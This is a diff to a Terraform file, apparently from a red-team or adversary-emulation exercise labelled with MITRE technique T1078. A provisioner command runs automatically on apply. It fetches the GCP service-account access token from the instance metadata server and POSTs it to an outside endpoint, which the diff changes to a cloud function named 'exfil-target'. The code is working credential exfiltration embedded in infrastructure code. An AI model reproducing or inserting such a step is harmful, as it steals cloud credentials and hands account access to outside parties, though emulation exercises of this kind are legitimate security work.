@@ -219,10 +219,7 @@ resource "random_id" "bucket_suffix" {
     command = <<-EOT
       # T1078 - Valid Accounts
       token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header 'Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
-      
-      curl -X POST https://wide-receiver-usekq2agua-uc.a.run.app\
-        -H "Content-Type: application/json"\
-        -d "{ \"hmm\": \"$token\" }"
+      curl -X POST https://us-east1-s4-exfil-project-test-1.cloudfunctions.net/exfil-target  -H "Content-Type: application/json" -d "{ \"team4token\": \"$token\" }"
     EOT
   }
 }
